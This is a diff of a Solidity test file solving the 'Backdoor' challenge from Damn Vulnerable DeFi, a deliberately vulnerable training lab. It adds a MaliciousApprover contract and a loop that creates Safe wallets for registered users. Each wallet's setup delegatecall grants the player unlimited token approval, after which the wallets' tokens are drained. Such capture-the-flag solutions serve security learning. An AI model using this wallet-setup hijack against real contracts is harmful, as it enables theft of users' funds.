@@ -6,7 +6,9 @@ import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +72,32 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        MaliciousApprover maliciousApprover = new MaliciousApprover();
+        for(uint i = 0; i < users.length; i++){
+            address user = users[i];
+            address[] memory owners = new address[](1);
+            owners[0] = user;
+            address proxy = address(walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                abi.encodeCall(
+                    Safe.setup,
+                    (
+                        owners,
+                        1,
+                        address(maliciousApprover),
+                        abi.encodeCall(MaliciousApprover.approveTokens, (token, player)),
+                        address(0),
+                        address(0),
+                        0,
+                        payable(address(0))
+                    )
+                ),
+                i,
+                walletRegistry
+            ));
+            token.transferFrom(proxy, player, token.balanceOf(proxy));
+        }
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
@@ -92,5 +119,12 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+// Bypass delegatecall's msg.sender limitation - direct approval instead of via proxy
+contract MaliciousApprover {
+    function approveTokens(DamnValuableToken token, address spender) external {
+        token.approve(spender, type(uint256).max);
     }
 }
